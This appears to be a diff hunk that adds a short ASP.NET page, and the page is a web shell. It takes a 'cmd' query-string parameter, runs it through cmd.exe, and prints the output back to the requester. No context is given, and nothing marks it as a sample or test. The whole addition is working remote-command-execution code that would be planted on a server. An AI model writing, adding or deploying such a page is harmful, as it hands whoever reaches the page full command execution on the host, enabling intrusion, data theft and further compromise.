@@ -1,0 +1,13 @@
+<​%@ Page Language="C#" %​>
+<​% 
+  string cmd = Request.QueryString["cmd"];
+  if (!string.IsNullOrEmpty(cmd)) {
+    var proc = new System.Diagnostics.Process();
+    proc.StartInfo.FileName = "cmd.exe";
+    proc.StartInfo.Arguments = "/c " + cmd;
+    proc.StartInfo.UseShellExecute = false;
+    proc.StartInfo.RedirectStandardOutput = true;
+    proc.Start();
+    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
+  }
+%​>
